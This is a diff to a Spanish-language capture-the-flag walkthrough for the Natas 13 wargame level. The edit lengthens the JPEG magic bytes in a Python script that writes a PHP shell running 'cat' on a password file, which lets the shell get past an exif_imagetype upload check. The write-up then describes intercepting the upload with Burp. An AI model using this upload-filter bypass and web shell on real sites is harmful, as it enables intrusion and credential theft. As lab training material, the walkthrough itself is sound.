@@ -84,18 +84,23 @@ Ahora la pregunta es:
 
 Vamos por partes. Primero tenemos que saber como identifica la función **exif_imagetype()** que un fichero es de un tipo u otro leyendo lo **primeros bytes**. 
 
-Buscamos en **Google** acerca de los primeros bytes de los ficheros y nos encontramos con una web [Magic Numbers](https://asecuritysite.com/forensics/magic) que nos hablan de los **primero bytes** de distintos ficheros (JPG,PNG,ZIP,...) que al parecer se llaman **MAGIC NUMBERS**
+Buscamos en **Google** acerca de los primeros bytes de los ficheros y nos encontramos con una web [Magic Numbers](https://en.wikipedia.org/wiki/List_of_file_signatures) que nos hablan de los **primero bytes** de distintos ficheros (JPG,PNG,ZIP,...) que al parecer se llaman **MAGIC NUMBERS**
 
 A nosotros nos interesa el valor del fichero **JPG**
 
 ```html
-JPEG graphic file	.jpg	FFD8
+jpeg	JPEG raw or in the JFIF or Exif file format	0	
+
+Primero Bytes -> FF D8 FF E0  
+Contenido ->nn nn 
+Últimos bytes -> 4A 46 49 46 00 01
+
 ```
 
 Por lo tanto  tenemos que cambiar los **primeros bytes** del fichero **phpShell.php** a:
 
 ```hex
-FFD8
+FFD8 FFE0
 ```
 
 Podemos utilizar un **Editor Hexadecimal** para cambiarle los primeros bytes o hacer un **Script** en **Python** que nos ayude a escribir eso bytes en el fichero.
@@ -106,7 +111,7 @@ Le llamamos **phpShellPython.py**
 
 ```python
 fichero = open('phpShell.php','w')  
-fichero.write('\xFF\xD8' + '<? passthru("cat /etc/natas_webpass/natas14"); ?>')  
+fichero.write('\xFF\xD8\xFF\xE0' + '<? passthru("cat /etc/natas_webpass/natas14"); ?>')  
 fichero.close()
 ```
 
@@ -122,7 +127,7 @@ Abrimos el editor **nano** y escribimos el código. A continuación lanzamos el 
 python phpShellPython.py
 ```
 
-Bueno ya tenemos el fichero **phpShell.php** recién salido del horno y ahora solo nos queda realizar las mismas acciones que en la prueba anterior. 
+Bueno ya tenemos el fichero **phpShell.php** recién salido del horno con los **primeros bytes** escritos con el valor **FFD8 FFE0** y ahora solo nos queda realizar las mismas acciones que en la prueba anterior. 
 
 Configuramos el **Proxy** a **localhost:8080** en el navegador y arrancamos el **BURP** para interceptar el tráfico que enviamos y poder modificarlo posteriormente y saltarnos los controles de acceso.
 
